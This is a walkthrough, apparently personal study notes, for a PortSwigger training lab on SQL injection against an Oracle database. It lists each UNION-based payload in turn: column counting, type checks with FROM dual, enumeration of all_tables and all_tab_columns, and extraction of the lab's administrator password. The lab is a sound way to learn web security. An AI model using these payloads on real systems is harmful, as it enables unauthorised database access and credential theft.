# [Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

## Steps

1. **Access the Lab**  
   - Navigate to the lab and click the "Accessories" category to send:  
     `GET /filter?category=Accessories`.  
   - Capture this request in Burp Suite.

2. **Determine Number of Columns**  
   - Test columns with `ORDER BY`:  
     - `category=Accessories' ORDER BY 1--`: 200 OK.  
     - `category=Accessories' ORDER BY 2--`: 200 OK.  
     - `category=Accessories' ORDER BY 3--`: 500 Error.  
   - **Result**: 2 columns.

3. **Check Column Data Types**  
   - Use `UNION SELECT` with `FROM dual` (Oracle-specific):  
     - `category=Accessories' UNION SELECT 'a','a' FROM dual--`: 200 OK.  
     - `category=Accessories' UNION SELECT 'a',NULL FROM dual--`: 200 OK.  
     - `category=Accessories' UNION SELECT NULL,'a' FROM dual--`: 200 OK.  
     - `category=Accessories' UNION SELECT NULL,NULL FROM dual--`: 200 OK.  
   - **Result**: Both columns accept string or NULL values.

4. **List Table Names**  
   - Query `all_tables` for table names:  
     - `category=Accessories' UNION SELECT TABLE_NAME,NULL FROM all_tables--`.  
   - **Result**: Finds table `USERS_ZCPUOJ`.

5. **List Column Names**  
   - Query `all_tab_columns` for columns in `USERS_ZCPUOJ`:  
     - `category=Accessories' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_ZCPUOJ'--`.  
   - **Result**: Finds columns `USERNAME_AZDTVG` and `PASSWORD_HULAXY`.

6. **Retrieve Credentials**  
   - Extract data from `USERS_ZCPUOJ`:  
     - `category=Accessories' UNION SELECT USERNAME_AZDTVG,PASSWORD_HULAXY FROM USERS_ZCPUOJ--`.  
   - **Result**: Gets credentials:  
     - Username: `administrator`  
     - Password: `07gxctwbujdgjrem7zyo`.

7. **Login and Solve**  
   - Log in with `administrator` / `07gxctwbujdgjrem7zyo` on the lab’s login page.  
   - Lab solved upon successful login.

## Notes
- Oracle requires `FROM dual` in `UNION SELECT` queries for standalone expressions.  
- Use `all_tables` and `all_tab_columns` (Oracle-specific) instead of `information_schema` used in non-Oracle databases.  
